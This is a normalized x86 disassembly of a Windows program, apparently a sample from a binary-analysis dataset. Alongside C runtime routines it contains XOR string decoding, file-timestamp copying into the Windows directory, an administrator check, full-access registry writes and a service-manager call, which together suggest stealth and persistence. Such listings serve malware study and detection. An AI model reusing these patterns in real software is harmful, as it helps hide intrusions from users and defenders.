push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_408920
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40895a
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_406d97
add esp 0x1c
test eax eax
jne r-xdata
sub_4089e0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_408a40 ]
jmp [ ecx * 4 + jump_table_408abc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_408b28 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_408b28 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_408cc0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_408bc8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408cc0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_408b28 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_408b28 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_408b28 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_408cc0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408cc0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408cc0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408cc0 ]
sub_408d15
push ebp
mov ebp esp
mov eax 0x1004
call sub_4087c0
push ebx
push esi
xor esi esi
push 0x1
push esi
push [ ebp + 0x8 ]
call sub_40581f
or ebx 0xffffffff
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax ebx
push 0x2
push esi
push [ ebp + 0x8 ]
call sub_40581f
add esp 0xc
cmp eax ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
mov ebx 0x1000
lea eax [ ebp - 0x1004 ]
push ebx
push esi
push eax
call sub_4087f0
push 0x8000
push [ ebp + 0x8 ]
call sub_40901b
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40581f
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40581f
push [ ebp + 0x8 ]
call sub_4080b0
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi ebx
jne r-xdata
push eax
lea eax [ ebp - 0x1004 ]
push eax
push [ ebp + 0x8 ]
call sub_405cb2
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
call sub_4057a8
mov [ eax ] 0xd
call [ GetLastError@IAT ]
mov edi eax
call sub_4057b1
mov [ eax ] edi
call sub_4057b1
cmp [ eax ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
call sub_4057a8
mov [ eax ] 0xd
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40901b
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
cmp edi ebx
mov eax ebx
jge r-xdata
sub_408e3a
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_408e96
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408e3a
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
push 0x1
pop eax
sub_408ec0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_403c8c
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_403ced
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_406ee0
mov ebx eax
add esp 0x4
call sub_406ee0
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_408f90
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_40895a
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_40895a
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_40901b
mov eax [ esp + 0x4 ]
push esi
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov esi 0x8000
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 4 + 0x4 ]
mov cl [ ecx + eax * 4 + 0x4 ]
mov al cl
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
call sub_4057a8
mov [ eax ] 0x16
or eax 0xffffffff
pop esi
retn
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
sub_409080
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4090b4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_406abc
pop ecx
jmp r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
push ebx
call sub_404e2a
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push 0x9
call sub_403c8c
push ebx
call sub_407391
pop ecx
mov [ ebp + 0xc ] eax
test eax eax
pop ecx
je r-xdata
mov eax edi
push esi
call sub_40879e
test eax eax
pop ecx
jne r-xdata
push 0x9
call sub_403ced
test esi esi
pop ecx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
push esi
push ebx
push eax
call sub_407b9c
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
push esi
call sub_4076e7
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi ebx
jmp r-xdata
push 0x9
call sub_403ced
pop ecx
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_405400
push ebx
push [ ebp + 0xc ]
call sub_4073bc
add esp 0x14
mov eax esi
push eax
push ebx
push edi
call sub_405400
push ebx
push [ ebp + 0xc ]
call sub_4073bc
add esp 0x14
mov eax esi
sub_4091f0
mov edx [ esp + 0x8 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ eax + ecx ] 0x0
retn
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi ebx
sub esi edx
mov edi ecx
mov [ esi + edx ] al
inc edx
dec edi
jne r-xdata
xor al 0x55
mov al [ edx ]
cmp al 0x55
je r-xdata
mov [ ecx + ebx ] 0x0
pop esi
pop ebx
pop edi
retn
sub_409240
sub esp 0x84
mov edx [ esp + 0x8c ]
push ebx
push ebp
push esi
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov [ esp + 0x10 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea ebx [ esp + 0x14 ]
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
xor edi edi
test ebp ebp
jle r-xdata
mov edx [ esp + 0x98 ]
mov [ edi + edx ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
mov ebx [ esp + 0x98 ]
mov esi edx
sub ebx edx
mov [ ebx + esi ] cl
inc edi
inc esi
cmp edi ebp
jl r-xdata
xor cl dl
mov eax edi
mov cl [ esi ]
cdq
idiv [ esp + 0x10 ]
mov dl [ esp + edx + 0x14 ]
cmp cl dl
je r-xdata
mov ecx [ esp + 0x98 ]
mov [ edi + ecx ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
sub_4092f0
sub esp 0x80
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push ebx
push esi
push edi
mov edi rw-data
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebx ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x98 ]
xor ecx ecx
test edi edi
jle r-xdata
pop edi
pop esi
pop ebx
add esp 0x80
retn
mov eax [ esp + 0x90 ]
push ebp
mov ebp [ esp + 0x98 ]
sub ebp eax
mov edx [ esp + 0x94 ]
mov eax ecx
lea esi [ ecx + edx ]
cdq
idiv ebx
mov al [ esp + edx + 0x10 ]
mov dl [ esi + ebp ]
xor al dl
inc ecx
cmp ecx edi
mov [ esi ] al
jl r-xdata
pop ebp
sub_4093c0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
mov ebx 0x1
[ edi ]
not ecx
dec ecx
mov edi esi
lea edx [ ecx + esi - 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx ebx
jle r-xdata
pop edi
pop esi
mov eax edx
pop ebx
retn
cmp [ edx ] 0x5c
je r-xdata
inc edx
dec edx
mov edi esi
or ecx 0xffffffff
xor eax eax
inc ebx
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jl r-xdata
pop edi
pop esi
mov eax edx
pop ebx
retn
sub_409410
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
jne r-xdata
pop edi
xor eax eax
pop esi
retn
push ebx
mov ebx [ esp + 0x14 ]
push esi
push ebx
call [ lstrcpyA@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffe
test ecx ecx
jle r-xdata
pop edi
pop esi
retn
pop ebx
pop edi
mov eax 0x1
pop esi
retn
cmp [ ecx + ebx ] 0x5c
je r-xdata
mov [ ecx + ebx ] 0x0
dec ecx
test ecx ecx
jg r-xdata
pop ebx
pop edi
mov eax 0x1
pop esi
retn
sub_409470
mov edx [ esp + 0x4 ]
sub esp 0x250
test edx edx
push ebx
push ebp
push esi
push edi
je r-xdata
lea ecx [ esp + 0x58 ]
push 0x104
push ecx
call [ GetWindowsDirectoryA@IAT ]
lea edx [ esp + 0x15c ]
push rw-data
push edx
call sub_409240
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x58 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x58 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x15c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x250
retn
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x10 ]
push ecx
lea eax [ esp + 0x24 ]
push edx
push eax
push esi
call [ GetFileTime@IAT ]
mov ebx [ CloseHandle@IAT ]
mov ebp [ Sleep@IAT ]
test eax eax
je r-xdata
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea ebx [ esp + 0x58 ]
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
jmp r-xdata
push esi
call ebx
push 0x64
call ebp
push esi
call ebx
mov ecx [ esp + 0x268 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x40000000
push ecx
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
push 0x0
push 0x80
and ecx 0x3
push 0x3
push 0x0
push 0x1
[ edi ] [ esi ]
mov edi [ CreateFileA@IAT ]
lea eax [ esp + 0x6c ]
push 0x80000000
push eax
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov edi [ FileTimeToSystemTime@IAT ]
lea edx [ esp + 0x28 ]
lea eax [ esp + 0x20 ]
push edx
push eax
call edi
lea ecx [ esp + 0x48 ]
lea edx [ esp + 0x18 ]
push ecx
push edx
call edi
lea eax [ esp + 0x38 ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
call edi
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x24 ]
push eax
push ecx
push esi
call [ SetFileTime@IAT ]
test eax eax
je r-xdata
push esi
call [ FlushFileBuffers@IAT ]
push 0x64
call ebp
sub_409610
sub esp 0x10
push ebx
xor ebx ebx
mov [ esp + 0xc ] bl
mov [ esp + 0xd ] bl
mov [ esp + 0xe ] bl
mov [ esp + 0xf ] bl
mov [ esp + 0x10 ] bl
mov [ esp + 0x11 ] 0x5
call sub_409690
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
push ecx
call [ AllocateAndInitializeSid@IAT ]
cmp eax ebx
mov [ esp + 0x4 ] eax
je r-xdata
pop ebx
add esp 0x10
retn
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
push edx
push eax
push ebx
call CheckTokenMembership
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ FreeSid@IAT ]
mov eax [ esp + 0x4 ]
mov [ esp + 0x4 ] ebx
sub_409690
sub esp 0x9c
push esi
mov esi [ GetVersionExA@IAT ]
push edi
mov ecx 0x27
xor eax eax
lea edi [ esp + 0x8 ]
[ edi ]
lea eax [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x9c
push eax
call esi
test eax eax
jne r-xdata
cmp [ esp + 0x18 ] 0x2
jne r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x94
push ecx
call esi
test eax eax
je r-xdata
xor eax eax
cmp [ esp + 0xc ] 0x5
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax 0x1
cmp ecx eax
je r-xdata
pop edi
pop esi
add esp 0x9c
retn
sub_409700
push ecx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
lea eax [ esp + 0xc ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x8 ]
push esi
mov [ esp + 0xc ] eax
push ecx
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x8 ]
push edx
mov edx [ esp + 0x18 ]
push eax
push 0x0
push ecx
push edx
mov [ esp + 0x1c ] 0x1
call [ RegQueryValueExA@IAT ]
mov esi eax
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
pop ecx
retn
xor eax eax
pop ecx
retn
sub_409770
push esi
mov esi [ esp + 0xc ]
lea eax [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push 0xf003f
push 0x0
push esi
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ esp + 0x14 ]
push edx
push 0x1
push eax
mov eax [ esp + 0x24 ]
push eax
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0x10 ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
xor eax eax
pop edi
test esi esi
sete al
pop esi
retn
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push 0x0
push 0xf003f
push 0x0
push rw-data
push 0x0
push esi
push edi
mov [ esp + 0x30 ] 0x1
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_409810
push ebx
push edi
push 0x48
call sub_406abc
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ecx 0x12
xor eax eax
mov edi ebx
[ edi ]
call sub_40a220
cmp ax 0x5
jl r-xdata
pop edi
pop ebx
retn
cmp ax 0x8
jl r-xdata
cmp ax 0x7
jg r-xdata
call sub_40a3a0
test eax eax
je r-xdata
mov [ ebx ] 0x0
mov eax ebx
pop edi
pop ebx
retn
mov [ ebx ] 0x2
jmp r-xdata
call sub_40a460
test eax eax
je r-xdata
mov [ ebx ] 0x0
mov eax ebx
pop edi
pop ebx
retn
mov edx [ esp + 0xc ]
test edx edx
je r-xdata
call sub_40a4c0
test eax eax
je r-xdata
mov [ ebx ] 0x0
mov eax ebx
pop edi
pop ebx
retn
mov eax [ ebx + 0x44 ]
test eax eax
jne r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
sub edi ecx
push esi
lea ebp [ ebx + 0x2 ]
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ax [ ebx ]
pop esi
cmp ax 0x1
pop ebp
jne r-xdata
call sub_40a400
neg eax
sbb eax eax
neg eax
inc eax
mov [ ebx ] ax
mov [ ebx ] 0x0
mov eax ebx
pop edi
pop ebx
retn
push eax
call sub_409a80
add esp 0x4
mov eax ebx
pop edi
pop ebx
retn
push ebx
call sub_404e2a
add esp 0x4
xor eax eax
pop edi
pop ebx
retn
cmp ax 0x2
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push edx
call sub_40a030
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
push edx
call sub_409db0
add esp 0x8
mov [ ebx + 0x44 ] eax
sub_409920
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push esi
call sub_404e2a
add esp 0x4
call sub_409a90
mov ax [ esi ]
cmp ax 0x1
jne r-xdata
cmp ax 0x2
jne r-xdata
mov ecx [ esi + 0x44 ]
lea eax [ esi + 0x2 ]
push eax
push ecx
call sub_40a120
add esp 0x8
push esi
call sub_404e2a
add esp 0x4
pop esi
retn
mov edx [ esi + 0x44 ]
push 0x0
push edx
call sub_409fd0
add esp 0x8
sub_409980
mov edx [ esp + 0x4 ]
sub esp 0x28
lea eax [ esp + 0x2c ]
lea ecx [ esp ]
push eax
push 0x28
push ecx
push edx
call sub_40a520
mov eax [ esp + 0x3c ]
add esp 0x10
cmp eax 0x4
jae r-xdata
cmp eax 0x28
jbe r-xdata
xor eax eax
add esp 0x28
retn
shr eax 0x2
mov eax 0xa
jmp r-xdata
push eax
lea eax [ esp + 0x4 ]
push eax
call sub_40a610
add esp 0x8
neg eax
sbb eax eax
neg eax
add esp 0x28
retn
sub_4099e0
mov edx [ esp + 0x4 ]
sub esp 0x28
lea eax [ esp + 0x2c ]
lea ecx [ esp ]
push eax
push 0x28
push ecx
push edx
call sub_40a520
mov eax [ esp + 0x3c ]
add esp 0x10
cmp eax 0x4
jae r-xdata
cmp eax 0x28
jbe r-xdata
xor eax eax
add esp 0x28
retn
shr eax 0x2
mov eax 0xa
jmp r-xdata
push eax
lea eax [ esp + 0x4 ]
push eax
call sub_40a760
add esp 0x8
neg eax
sbb eax eax
neg eax
add esp 0x28
retn
sub_409aa0
sub esp 0x20
push ebx
push ebp
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
test eax eax
